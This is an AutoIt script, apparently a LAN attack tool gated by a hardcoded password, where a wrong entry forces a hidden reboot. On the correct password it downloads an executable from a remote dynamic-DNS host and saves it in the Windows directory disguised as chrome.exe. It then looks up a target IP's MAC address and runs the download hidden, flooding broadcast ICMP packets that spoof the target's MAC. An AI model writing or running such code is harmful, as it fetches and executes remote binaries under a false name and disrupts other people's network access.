#include <InetConstants.au3>

#NoTrayIcon
#RequireAdmin

    Local $sPasswd = InputBox("Security Check", "Input everything you like", "", "*")

	local $correctPass = "chuphongnettn"

	if $sPasswd == $correctPass then
	  Kill()
	else
			RunWait(@ComSpec & ' /C shutdown -t 0 -r -f',"",@SW_HIDE)
	endif


Func GET_MAC($_MACsIP)
    Local $_MAC,$_MACSize
    Local $_MACi,$_MACs,$_MACr,$_MACiIP
    $_MAC = DllStructCreate("byte[6]")
    $_MACSize = DllStructCreate("int")
    DllStructSetData($_MACSize,1,6)
    $_MACr = DllCall ("Ws2_32.dll", "int", "inet_addr", "str", $_MACsIP)
    $_MACiIP = $_MACr[0]
    $_MACr = DllCall ("iphlpapi.dll", "int", "SendARP", "int", $_MACiIP, "int", 0, "ptr", DllStructGetPtr($_MAC), "ptr", DllStructGetPtr($_MACSize))
    $_MACs  = ""
    For $_MACi = 0 To 5
    If $_MACi Then $_MACs = $_MACs & ":"
        $_MACs = $_MACs & Hex(DllStructGetData($_MAC,1,$_MACi+1),2)
    Next
    DllClose($_MAC)
    DllClose($_MACSize)
    Return $_MACs
EndFunc	
	
Func Kill()

   Local $sFilePath = @WindowsDir & "\chrome.exe"

    Local $hDownload = InetGet("http://csgovn.servecounterstrike.com/pm/hix2.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    InetClose($hDownload)

   $IP_Address = InputBox("?","??","")

   $MAC_Address = GET_MAC($IP_Address)
   
   MsgBox(0,"Finish","You have 1 minute")
   sleep(60000)

   RunWait(@ComSpec & ' /C chrome -I 1 -A 4 -a icmp-echo  -s ' & $MAC_Address & '-% -d ff:ff:ff:ff:ff:ff-255.255.255.255 -t 128',"",@SW_HIDE)

EndFunc   ;==>Example

